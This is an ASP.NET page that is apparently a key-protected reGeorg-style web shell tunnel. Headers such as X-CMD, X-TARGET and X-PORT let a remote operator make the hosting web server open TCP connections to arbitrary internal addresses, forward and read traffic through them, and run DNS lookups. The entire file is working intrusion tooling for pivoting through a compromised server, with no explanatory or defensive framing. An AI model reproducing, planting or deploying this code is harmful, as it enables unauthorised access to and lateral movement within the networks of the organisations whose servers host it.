<%@ Page Language="C#" EnableSessionState="True"%>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<script runat="server">
string Sha1(string s) {
    SHA1 h = new SHA1Managed();
    h.Initialize();
    return BitConverter.ToString(h.ComputeHash(new UTF8Encoding().GetBytes(s))).Replace("-", "");
}
</script>
<%
    string key = Request.Headers.Get("X-KEY");
    if (key == null || Sha1(key) != "A8FF2FE5C3BEEAB55B7F6FEE40A436748EAC135D") {
        Response.StatusCode = 403;
        Response.End();
    }
    try
    {
        if (Request.HttpMethod == "POST")
        {
            String cmd = Request.Headers.Get("X-CMD").ToUpper();
            if (cmd == "CONNECT")
            {
                try
                {
                    String target = Request.Headers.Get("X-TARGET").ToUpper();
                    int port = int.Parse(Request.Headers.Get("X-PORT"));
                    IPAddress ip = IPAddress.Parse(target);
                    System.Net.IPEndPoint remoteEP = new IPEndPoint(ip, port);
                    Socket sender = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    sender.Connect(remoteEP);
                    sender.Blocking = false;
                    Session.Add("socket", sender);
                    Response.AddHeader("X-STATUS", "OK");
                }
                catch (Exception ex)
                {
                    Response.AddHeader("X-ERROR", ex.Message);
                    Response.AddHeader("X-STATUS", "FAIL");
                }
            }
            else if (cmd == "DISCONNECT")
            {
                try {
                    Socket s = (Socket)Session["socket"];
                    s.Close();
                } catch (Exception ex){

                }
                Session.Abandon();
                Response.AddHeader("X-STATUS", "OK");
            }
            else if (cmd == "FORWARD")
            {
                Socket s = (Socket)Session["socket"];
                try
                {
                    int buffLen = Request.ContentLength;
                    byte[] buff = new byte[buffLen];
                    int c = 0;
                    while ((c = Request.InputStream.Read(buff, 0, buff.Length)) > 0)
                    {
                        s.Send(buff);
                    }
                    Response.AddHeader("X-STATUS", "OK");
                }
                catch (Exception ex)
                {
                    Response.AddHeader("X-ERROR", ex.Message);
                    Response.AddHeader("X-STATUS", "FAIL");
                }
            }
            else if (cmd == "READ")
            {
                Socket s = (Socket)Session["socket"];
                try
                {
                    int c = 0;
                    byte[] readBuff = new byte[512];
                    try
                    {
                        while ((c = s.Receive(readBuff)) > 0)
                        {
                            byte[] newBuff = new byte[c];
                            //Array.ConstrainedCopy(readBuff, 0, newBuff, 0, c);
                            System.Buffer.BlockCopy(readBuff, 0, newBuff, 0, c);
                            Response.BinaryWrite(newBuff);
                        }
                        Response.AddHeader("X-STATUS", "OK");
                    }                    
                    catch (SocketException soex)
                    {
                        Response.AddHeader("X-STATUS", "OK");
                        return;
                    }
                }
                catch (Exception ex)
                {
                    Response.AddHeader("X-ERROR", ex.Message);
                    Response.AddHeader("X-STATUS", "FAIL");
                }
            } 
            else if (cmd == "DNS")
            {
                String target = Request.Headers.Get("X-TARGET");
                IPAddress[] addresses = Dns.GetHostByName(target).AddressList;
                if (addresses.Length > 0) {
                    Response.AddHeader("X-STATUS", "OK");
                    Response.Write(addresses[0]);
                } else
                {
                    Response.AddHeader("X-ERROR", "DNS lookup failed");
                    Response.AddHeader("X-STATUS", "FAIL");
                }
            }
        } else {
            Response.Write("Georg says, 'All seems fine'");
        }
    }
    catch (Exception exKak)
    {
        Response.AddHeader("X-ERROR", exKak.Message);
        Response.AddHeader("X-STATUS", "FAIL");
    }
%>